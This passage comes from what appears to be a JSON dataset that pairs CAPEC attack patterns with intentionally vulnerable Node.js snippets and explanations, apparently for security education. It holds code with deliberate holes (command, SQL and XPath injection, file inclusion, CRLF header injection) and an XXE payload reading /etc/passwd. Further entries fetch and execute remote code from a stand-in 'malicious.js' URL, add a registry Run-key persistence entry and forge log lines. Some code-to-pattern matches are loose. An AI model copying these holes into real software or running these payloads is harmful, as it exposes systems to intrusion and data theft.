        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a command from the URL query parameter 'cmd' and executes it using the 'exec' function from the 'child_process' module. The output of the command is then sent back to the client. This code is vulnerable to OS Command Injection (CWE-78) because it directly uses user input to construct and execute a command without proper sanitization or validation. This embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' and highlights the risks associated with improper neutralization of special elements in commands."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/xml', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    const userInput = result.user.input[0];\n    const query = `//users/user[name='${userInput}']`;\n    // Simulate an XML database query\n    const fakeXmlDatabase = `<users><user><name>admin</name><password>secret</password></user></users>`;\n    xml2js.parseString(fakeXmlDatabase, (err, dbResult) => {\n      if (err) {\n        res.status(500).send('Server Error');\n        return;\n      }\n      const xpath = require('xpath'), dom = require('xmldom').DOMParser;\n      const doc = new dom().parseFromString(fakeXmlDatabase);\n      const nodes = xpath.select(query, doc);\n      if (nodes.length > 0) {\n        res.send(`User found: ${nodes[0].firstChild.data}`);\n      } else {\n        res.send('User not found');\n      }\n    });\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable XML Injection scenario using an Express.js server. The server accepts XML input from a POST request, parses it, and constructs an XPath query using user-controllable input. The query is then used to search a simulated XML database. The code does not properly neutralize special elements in the user input, making it susceptible to XML Injection attacks. An attacker could manipulate the input to alter the structure of the XPath query, potentially gaining unauthorized access to sensitive data."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLocalLibrary(libName) {\n  const libPath = path.join(__dirname, libName);\n  if (fs.existsSync(libPath)) {\n    const lib = require(libPath);\n    return lib;\n  } else {\n    throw new Error('Library not found');\n  }\n}\n\n// Example usage\ntry {\n  const myLib = loadLocalLibrary('vulnerableLib.js');\n  myLib.execute();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a Local Code Inclusion vulnerability. The `loadLocalLibrary` function takes a library name as input, constructs a path to the library file, and attempts to load it using `require`. If the file exists, it is loaded and returned; otherwise, an error is thrown. This code is vulnerable because it allows an attacker to force the application to load arbitrary code files from the local machine, potentially including malicious or outdated libraries with known vulnerabilities. This embodies CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-913 (Improper Control of Dynamically-Managed Code Resources)."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.write('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.write(data);\n      }\n      res.end();\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.write('No file specified');\n    res.end();\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves the content of a file specified by a query parameter in the URL. The server uses the 'fs' module to read the file from the local filesystem. The main vulnerability here is that the 'file' query parameter is not validated or sanitized, allowing an attacker to specify any file path on the server. This can lead to Local File Inclusion (LFI) attacks, where an attacker can read sensitive files or execute arbitrary code if the file contains executable scripts. This example embodies the main idea of CAPEC-98 and related CWEs by demonstrating how improper control of file paths and reliance on external input can lead to severe security issues."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "const http = require('http');\nconst vm = require('vm');\n\nconst remoteCodeUrl = 'http://example.com/malicious.js';\n\nhttp.get(remoteCodeUrl, (res) => {\n  let code = '';\n\n  res.on('data', (chunk) => {\n    code += chunk;\n  });\n\n  res.on('end', () => {\n    try {\n      vm.runInThisContext(code);\n    } catch (e) {\n      console.error('Error executing remote code:', e);\n    }\n  });\n}).on('error', (e) => {\n  console.error('Error fetching remote code:', e);\n});",
        "description": "This JavaScript code snippet demonstrates a Remote Code Inclusion vulnerability. It fetches and executes code from a remote URL without verifying the origin or integrity of the code, which aligns with CWE-494 (Download of Code Without Integrity Check). The use of 'vm.runInThisContext' to execute the fetched code represents CWE-829 (Inclusion of Functionality from Untrusted Control Sphere). This snippet is vulnerable because an attacker could host malicious code at the specified URL, leading to arbitrary code execution on the client side."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xml, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed result:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a DTD Injection vulnerability using the xml2js library. The XML input includes a Document Type Definition (DTD) that defines an external entity 'xxe' referencing the system file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive information. This example embodies the main idea of CAPEC-228: DTD Injection, and highlights CWE-827 (Improper Control of Document Type Definition) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs). The code does not restrict the DTD, allowing arbitrary file access, which can lead to information exposure or other malicious actions."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      const arraySize = parseInt(result.array.$.size, 10);\n      const arrayData = result.array.item;\n      const buffer = Buffer.alloc(arraySize * 4); // Assume each item is 4 bytes\n      for (let i = 0; i < arrayData.length; i++) {\n        buffer.writeInt32LE(arrayData[i], i * 4);\n      }\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Array processed');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that processes SOAP requests containing an array. The server reads the array size from the XML request and allocates a buffer based on this size. It then attempts to write the array data into the buffer. The vulnerability arises because the server trusts the array size specified in the request without verifying it against the actual data length. This can lead to a buffer overflow if the actual data length exceeds the allocated buffer size, embodying the main idea of the CAPEC 'SOAP Array Overflow' and related CWEs such as 'Buffer Access with Incorrect Length Value' and 'Improper Handling of Length Parameter Inconsistency'."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "const fs = require('fs');\n\n// Simulate a transaction data structure\nlet transaction = {\n  id: 1,\n  amount: 100,\n  status: 'pending'\n};\n\n// Log transaction data to a file (CWE-532)\nfs.appendFile('transaction.log', JSON.stringify(transaction) + '\\n', (err) => {\n  if (err) throw err;\n  console.log('Transaction data logged');\n});\n\n// Simulate an attacker modifying the transaction data (CWE-766, CWE-767)\ntransaction.amount = 1000000;\ntransaction.status = 'completed';\n\n// Log the modified transaction data to a file (CWE-532)\nfs.appendFile('transaction.log', JSON.stringify(transaction) + '\\n', (err) => {\n  if (err) throw err;\n  console.log('Modified transaction data logged');\n});\n\n// Simulate an authentication bypass (CWE-287)\nlet isAuthenticated = false;\nif (!isAuthenticated) {\n  console.log('Authentication bypassed');\n  // Allow access to sensitive operation\n  console.log('Sensitive operation executed');\n}",
        "description": "This JavaScript code snippet demonstrates several deprecated weaknesses related to the abuse of transaction data structures. The code simulates a transaction and logs it to a file, representing CWE-532 (Information Exposure Through Log Files). It then modifies the transaction data, illustrating CWE-766 and CWE-767 (Failure to Protect Stored Data from Modification). Finally, it simulates an authentication bypass (CWE-287), allowing access to a sensitive operation without proper authentication. This code embodies the main idea of the deprecated CAPEC by showing how transaction data can be abused and manipulated, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/login') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      // Client-side authentication (CWE-603)\n      if (username === 'admin' && password === 'password123') {\n        const token = crypto.randomBytes(16).toString('hex');\n        res.writeHead(200, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ token }));\n      } else {\n        res.writeHead(401, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ error: 'Unauthorized' }));\n      }\n    });\n  } else {\n    res.writeHead(404, { 'Content-Type': 'application/json' });\n    res.end(JSON.stringify({ error: 'Not Found' }));\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple HTTP server that performs client-side authentication. The server listens for POST requests to the '/login' endpoint and checks the provided username and password. If the credentials match 'admin' and 'password123', it generates a token and sends it back to the client. This code is vulnerable to several issues: \n1. **Client-Side Authentication (CWE-603)**: The authentication logic is implemented on the client side, making it easy to bypass by modifying the client code.\n2. **Capture-Replay Attack (CWE-294)**: Since the token is generated and sent over the network without additional security measures, an attacker could sniff the network traffic and replay the token to gain unauthorized access.\n3. **Sniffing Application Code (CAPEC-65)**: The code and credentials can be captured during transmission, leading to potential security breaches."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst server = http.createServer((req, res) => {\n  if (req.url === '/patch' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Vulnerable: Saving patch data to a file without proper authentication\n      fs.writeFile('patch_data.txt', body, (err) => {\n        if (err) throw err;\n        console.log('Patch data saved!');\n        res.end('Patch received');\n      });\n    });\n  } else {\n    res.statusCode = 404;\n    res.end('Not Found');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/patch' endpoint. When a request is received, it captures the data and saves it to a file named 'patch_data.txt' without performing any authentication checks. This embodies the main idea of CAPEC-65, where an attacker could sniff and capture application code during patching. The code also reflects CWE-603 (Use of Client-Side Authentication) by not implementing server-side authentication, making it vulnerable to unauthorized access. Additionally, it hints at CWE-294 (Authentication Bypass by Capture-replay) as the lack of proper authentication could allow an attacker to replay captured data to the server."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  console.log('Connected');\n  client.write('AUTH user:password'); // Client-side authentication\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection after receiving data\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// Sniffing and capturing network traffic\nconst sniff = require('sniff');\nsniff.start('127.0.0.1', 1337, (packet) => {\n  console.log('Sniffed packet: ' + packet);\n  // Replay the captured packet\n  const replayClient = new net.Socket();\n  replayClient.connect(1337, '127.0.0.1', () => {\n    replayClient.write(packet);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-server interaction where client-side authentication is used, making it susceptible to capture-replay attacks. The client connects to a server and sends authentication credentials. A separate sniffing function captures network traffic and replays the captured packets to the server, potentially bypassing authentication. This embodies the main idea of CAPEC-65, highlighting vulnerabilities such as CWE-294 (Authentication Bypass by Capture-replay) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst mysql = require('mysql');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.post('/search', (req, res) => {\n  const searchTerm = req.body.searchTerm;\n  const query = `SELECT * FROM users WHERE name LIKE '%${searchTerm}%'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n      res.status(500).send('Internal Server Error');\n      return;\n    }\n    res.json(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes an endpoint '/search' that takes a 'searchTerm' from the request body and constructs an SQL query to search for users by name. The query is vulnerable to SQL Injection (CWE-89) because it directly incorporates user input without proper sanitization. Additionally, if an error occurs during the query execution, the error message is logged and a generic error message is sent to the client, which could potentially expose sensitive information (CWE-209). This code exemplifies the CAPEC concept of 'Fuzzing for garnering other adjacent user/sensitive data' by allowing an attacker to send modified queries that could return unintended information or cause errors that reveal sensitive details."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(filePath) {\n  if (!fs.existsSync(filePath)) {\n    console.error('File does not exist.');\n    return;\n  }\n\n  const fileExtension = path.extname(filePath);\n  if (fileExtension !== '.txt') {\n    console.error('Unsupported file type.');\n    return;\n  }\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n\n    // Simulate processing the file\n    console.log('Processing file:', data);\n  });\n}\n\n// Example usage\nprocessFile('user_upload.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerable file processing function that embodies the main idea of the CAPEC 'Force Use of Corrupted Files'. The function 'processFile' takes a file path as input and performs several checks before processing the file. It checks if the file exists and if the file extension is '.txt'. However, this code is vulnerable to several issues: \n1. CWE-646: Reliance on File Name or Extension of Externally-Supplied File - The code relies on the file extension to determine if the file is safe to process, which can be easily bypassed by an attacker renaming a malicious file with a '.txt' extension.\n2. CWE-434: Unrestricted Upload of File with Dangerous Type - The code does not perform any content validation, allowing potentially dangerous files to be processed.\n3. CWE-829: Inclusion of Functionality from Untrusted Control Sphere - The file being processed could come from an untrusted source, leading to potential execution of malicious code.\n4. CWE-377: Insecure Temporary File - Although not directly shown, if the file were to be temporarily stored, it could be done insecurely.\n\nThe code represents the idea of an application being forced to use a corrupted or malicious file, leading to potential denial of service or other security issues."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "const exec = require('child_process').exec;\n\n// CWE-1108: Excessive Reliance on Global Variables\nlet globalEnvVar = process.env.PATH;\n\nfunction runCommand(userInput) {\n  // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n  let command = `echo ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\nlet userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The code uses the 'exec' function from the 'child_process' module to execute a command that includes user input without proper sanitization, leading to potential command injection (CWE-95). It also relies on a global variable 'globalEnvVar' to store an environment variable (CWE-1108). Additionally, the 'userInput' variable is declared in a wider scope than necessary (CWE-1126). This code snippet highlights the risks of improper handling of environment variables and user inputs, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "var globalVar = 'sensitiveData';\n\nfunction manipulateGlobalVar(userInput) {\n    eval('globalVar = ' + userInput);\n}\n\nmanipulateGlobalVar('\"maliciousCode\"');\nconsole.log(globalVar);",
        "description": "This JavaScript code snippet demonstrates the vulnerability of global variable manipulation. The global variable 'globalVar' is declared and holds sensitive data. The function 'manipulateGlobalVar' takes user input and uses 'eval' to dynamically assign a new value to 'globalVar'. This allows an attacker to inject malicious code through the user input, leading to potential security risks. The code embodies the main idea of CAPEC-77 by showing how improper control of dynamically-identified variables (CWE-914) and excessive reliance on global variables (CWE-1108) can lead to vulnerabilities."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "const userInput = \"../../etc/passwd\";\n\nfunction validateInput(input) {\n  const validPattern = /^[a-zA-Z0-9_]+$/;\n  return validPattern.test(input);\n}\n\nfunction canonicalizeInput(input) {\n  const path = require('path');\n  return path.normalize(input);\n}\n\nif (validateInput(userInput)) {\n  const safeInput = canonicalizeInput(userInput);\n  console.log(`Safe input: ${safeInput}`);\n} else {\n  console.log('Invalid input detected');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'. The code first validates the user input using a regular expression to ensure it only contains alphanumeric characters and underscores. However, it performs this validation before canonicalizing the input. The canonicalization step, which normalizes the input path, is done after validation. This order of operations can lead to security issues because the input might be considered valid initially but become invalid or dangerous after canonicalization. For example, the input '../../etc/passwd' would pass the validation but could be normalized to a path that accesses sensitive files, leading to potential security breaches."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n    let userInput = req.body.input;\n    // Validate input before canonicalization\n    if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n        return res.status(400).send('Invalid input');\n    }\n    // Canonicalize input\n    userInput = decodeURIComponent(userInput);\n    // Use the input in a file path\n    const filePath = `/uploads/${userInput}.txt`;\n    res.send(`File path is: ${filePath}`);\n});\n\napp.listen(port, () => {\n    console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express server that handles POST requests to the '/submit' endpoint. The server receives user input, validates it using a regular expression to allow only alphanumeric characters, and then decodes the input using `decodeURIComponent`. This sequence represents the CAPEC 'Leverage Alternate Encoding' by demonstrating improper handling of alternate encoding (CWE-173) and incorrect behavior order (CWE-180). The validation occurs before canonicalization, which can lead to security issues if the input is maliciously encoded. The code also constructs a file path using the user input, which can be influenced by external input (CWE-73)."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  const logEntry = `${new Date().toISOString()} - ${event}\\n`;\n  fs.appendFileSync(logFilePath, logEntry);\n}\n\nfunction manipulateLog() {\n  const maliciousEntry = '2023-10-01T00:00:00.000Z - User login: admin\\n';\n  fs.appendFileSync(logFilePath, maliciousEntry);\n}\n\n// Example usage\nlogEvent('User login: user123');\nmanipulateLog();",
        "description": "This JavaScript code snippet demonstrates a basic logging mechanism and how an attacker might manipulate the log file. The `logEvent` function appends a log entry to a log file, while the `manipulateLog` function appends a forged log entry. This example highlights the vulnerability described in CAPEC-116: Audit Log Manipulation. The code does not implement proper access controls or output neutralization, making it susceptible to CWE-117 (Improper Output Neutralization for Logs) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). Additionally, the log file could potentially contain sensitive information (CWE-532) and may log excessive data (CWE-779) or insufficient data (CWE-778)."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "const fs = require('fs');\nconst registry = require('winreg');\n\n// Insecurely storing sensitive information in the registry\nconst regKey = new registry({\n  hive: registry.HKCU, // Current User\n  key: '\\\\Software\\\\MyApp'\n});\n\nconst sensitiveData = 'password123'; // Sensitive data in cleartext\n\nregKey.set('SensitiveInfo', registry.REG_SZ, sensitiveData, (err) => {\n  if (err) console.error('Error setting registry key:', err);\n  else console.log('Registry key set successfully');\n});\n\n// Incomplete documentation of program execution\nfunction executeTask() {\n  // Task execution logic\n  console.log('Executing task...');\n}\n\n// Privilege context switching error\nfunction performPrivilegedAction() {\n  try {\n    process.setuid(0); // Switch to root user\n    executeTask();\n  } catch (err) {\n    console.error('Privilege context switching error:', err);\n  } finally {\n    process.setuid(process.env.USER); // Switch back to original user\n  }\n}\n\nperformPrivilegedAction();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to registry manipulation and other weaknesses. It insecurely stores sensitive information (a password) in the Windows registry in cleartext (CWE-314). The code also includes a function with incomplete documentation of its execution (CWE-1112). Additionally, it shows a privilege context switching error (CWE-270) by attempting to switch to a root user to perform a task and then switching back to the original user. These vulnerabilities highlight the risks associated with improper handling of sensitive data, inadequate documentation, and incorrect privilege management."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "const { exec } = require('child_process');\nconst registryKey = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';\nconst appName = 'MaliciousApp';\nconst appPath = 'C:\\\\Path\\\\To\\\\MaliciousApp.exe';\n\nexec(`reg add ${registryKey} /v ${appName} /t REG_SZ /d ${appPath} /f`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Stdout: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary can add a new entry to the Windows registry 'run keys' to ensure that a malicious application is executed whenever a user logs in. The 'exec' function from the 'child_process' module is used to run a command that adds a new registry key under 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'. The key is named 'MaliciousApp' and points to the executable path 'C:\\Path\\To\\MaliciousApp.exe'. This code embodies the CAPEC idea of 'Modification of Registry Run Keys' and highlights the CWE-15 'External Control of System or Configuration Setting' by allowing external control over the registry settings. It also touches on CWE-314 'Cleartext Storage in the Registry' as the path to the executable is stored in cleartext."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\n// Middleware to parse JSON bodies\napp.use(express.json());\n\n// Endpoint to update schema\napp.post('/update-schema', (req, res) => {\n  const schemaPath = './schema.json';\n  const newSchema = req.body.schema;\n\n  // CWE-15: External Control of System or Configuration Setting\n  fs.writeFile(schemaPath, JSON.stringify(newSchema), (err) => {\n    if (err) {\n      return res.status(500).send('Error updating schema');\n    }\n    res.send('Schema updated successfully');\n  });\n});\n\n// Endpoint to get data based on schema\napp.get('/data', (req, res) => {\n  const schemaPath = './schema.json';\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  fs.readFile(schemaPath, 'utf8', (err, schemaData) => {\n    if (err) {\n      return res.status(500).send('Error reading schema');\n    }\n    const schema = JSON.parse(schemaData);\n    // Simulate data retrieval based on schema\n    const data = { message: 'Data based on schema', schema: schema };\n    res.json(data);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js server with endpoints to update and retrieve a schema. The '/update-schema' endpoint allows an external user to modify the schema by sending a new schema in the request body. This represents CWE-15 (External Control of System or Configuration Setting) as it allows external control over the schema configuration. The '/data' endpoint reads the schema and returns data based on it, potentially exposing sensitive system information (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). This setup embodies the main idea of Schema Poisoning (CAPEC) by allowing an adversary to corrupt or modify the schema, which can lead to various security issues."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    client.write('AUTH user:password');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // CWE-294: Authentication Bypass by Capture-replay\n    if (data.toString() === 'AUTH_SUCCESS') {\n        client.write('REPLAY AUTH user:password');\n    }\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString().includes('MODIFIED')) {\n        console.log('Message integrity compromised');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        console.log('Server received: ' + data);\n        if (data.toString().startsWith('AUTH')) {\n            socket.write('AUTH_SUCCESS');\n        }\n    });\n});\n\nserver.listen(1337, '127.0.0.1');",
        "description": "This JavaScript code snippet demonstrates a simple TCP client-server communication using the 'net' module. The client connects to the server and sends an authentication message. The server responds with an 'AUTH_SUCCESS' message. The client then attempts to replay the authentication message, illustrating CWE-294 (Authentication Bypass by Capture-replay). The server does not verify the source of the communication channel, representing CWE-940 (Improper Verification of Source of a Communication Channel). Additionally, the code checks for message integrity issues, representing CWE-924 (Improper Enforcement of Message Integrity During Transmission). The overall scenario embodies the main idea of CAPEC-272 (Protocol Manipulation), where an adversary can manipulate the communication protocol to perform various attacks."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.headers['x-user-input'];\n  // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n  res.setHeader('Content-Type', 'text/plain');\n  res.setHeader('X-User-Input', userInput); // Potentially dangerous if userInput contains CRLF\n  res.end('Hello, world!');\n}).listen(8080);\n\n// Malicious user input example: 'malicious\\r\\nHTTP/1.1 200 OK\\r\\nContent-Length: 0\\r\\n\\r\\nInjected Response'\n// This can lead to HTTP Response Smuggling (CAPEC-33) if the backend server or intermediary proxies interpret the injected response differently.",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. It reads a custom header 'x-user-input' from the incoming request and sets it as a response header without proper sanitization. This can lead to HTTP Response Smuggling (CAPEC-33) if the user input contains CRLF sequences, as described in CWE-113. The code demonstrates how improper neutralization of special elements in HTTP headers can allow an attacker to inject malicious content, potentially causing inconsistent interpretation of HTTP requests/responses (CWE-444) and other related vulnerabilities."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Access granted for GET request');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server checks the HTTP method of incoming requests. If the method is 'GET', it grants access and responds with 'Access granted for GET request'. For any other HTTP method, it denies access and responds with 'Access denied'. This code embodies the main idea of CAPEC-274 (HTTP Verb Tampering) by demonstrating how an attacker could potentially bypass access restrictions if the server only checks for a specific HTTP method (CWE-654). The code also highlights the risk of relying on a single factor for security decisions. An attacker could use a different HTTP verb to bypass the access control, exploiting the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const userInput = req.url.slice(1); // Assume the URL contains the hostname\n  dns.resolve4(userInput, (err, addresses) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('DNS resolution error');\n      return;\n    }\n    const targetIP = addresses[0];\n    dns.reverse(targetIP, (err, hostnames) => {\n      if (err || !hostnames.includes(userInput)) {\n        res.writeHead(500);\n        res.end('Reverse DNS check failed');\n        return;\n      }\n      // Simulate a security-critical action based on the resolved IP\n      res.writeHead(200);\n      res.end(`Access granted to ${targetIP}`);\n    });\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) and resolves a hostname provided by the user via the URL. It performs a DNS resolution to get the IP address and then a reverse DNS lookup to verify the hostname. If the reverse DNS check passes, it simulates a security-critical action by granting access. This code embodies the DNS Rebinding attack concept by showing how an adversary could manipulate DNS responses to gain unauthorized access to internal network resources. The code also highlights related weaknesses such as reliance on reverse DNS resolution (CWE-350) and binding to an unrestricted IP address (CWE-1327)."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // Sending sensitive data in cleartext\n    client.write('username=admin&password=secret');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Improper neutralization of received data\n    if (data.toString().includes('success')) {\n        console.log('Login successful');\n    }\n    client.destroy();\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
